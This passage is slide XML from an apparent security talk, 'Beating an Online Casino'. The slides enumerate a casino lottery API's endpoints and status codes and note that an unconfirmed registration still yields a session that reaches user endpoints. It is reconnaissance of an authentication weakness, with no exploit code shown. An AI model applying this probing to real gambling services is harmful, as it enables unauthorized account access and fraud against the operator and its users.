              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/forgot_password</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/new (405)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/ (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/123 (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/verify (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="610" name="Google Shape;610;p75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="611" name="Google Shape;611;p75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="615" name="Shape 615"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="616" name="Google Shape;616;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;617;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="618" name="Google Shape;618;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="619" name="Google Shape;619;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="2530500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/new</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-349250" lvl="1" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>email, password, password2</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Pretty standard: Allows to register but your user needs to be confirmed</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>But you have a session created that gives you access to:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>verify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> (405)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="6400800" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>??????</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="620" name="Google Shape;620;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="624" name="Shape 624"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="625" name="Google Shape;625;p77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="2831400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "userid": "123456789",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
